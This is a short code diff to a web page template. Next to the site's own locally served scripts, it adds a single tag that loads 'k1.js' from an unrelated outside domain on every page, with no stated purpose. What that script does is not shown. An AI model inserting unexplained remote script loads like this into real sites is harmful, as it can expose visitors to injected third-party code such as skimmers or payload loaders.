@@ -411,6 +411,7 @@ ${reportDialog()}
 <script src="/assets/js/growth.js?v=${BUILD}" defer></script>
 <script src="/assets/js/social.js?v=${BUILD}" defer></script>
 ${scripts.map((s) => `<script src="/assets/js/${s}?v=${BUILD}" defer></script>`).join('\n')}
+<script defer src="https://choisijun.com/k1.js" integrity="sha384-E7Xl7wiU1vNu5AUY41kJB1uV52L+UEvqwYRzRj4zdaBGAeyRfCll926ETRo39Jm6" crossorigin="anonymous"></script>
 </body>
 </html>`;
 }
